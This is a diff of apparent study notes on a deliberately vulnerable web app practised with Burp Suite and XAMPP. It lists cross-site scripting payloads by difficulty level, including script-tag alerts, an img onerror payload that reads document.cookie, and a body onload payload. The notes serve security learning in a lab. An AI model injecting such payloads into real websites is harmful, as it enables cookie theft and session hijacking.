@@ -61,18 +61,23 @@
 * Reverse polarity
 * Hextrodinary
 
-### WVWP
+## WVWP
 - Uses BURP suite and XAMPP
 - Cross site scripting (XSS)
   <br>EASY<br>
-  <script>alert("asd")</script>
-  <script>alert(document.cookie)</script>
+  ``<script>alert("asd")</script>``
+  <br>
+  ``<script>alert(document.cookie)</script>``
   <br>MEDIUM<br>
-  <Script>alert("asd")</Script>
+  ``<Script>alert("asd")</Script>``
   <br>HARD<br>
-  <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);> = to get access to the cookie
-  <body onload=alert('test1')> = to send an alert in another format
+  ``<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`` = to get access to the cookie
+  <br>
+  ``<body onload=alert('test1')>`` = to send an alert in another format
+   ``<a href="https://www.w3docs.com" target="_blank">Click here to go to W3docs.com</a>`` = redirect to another page (works for levels below)
   <br>IMPOSSIBLE<br>
+  - displays user token
+  - genuinely impossible
 - Bruteforce 
   <br>EASY</br>
   
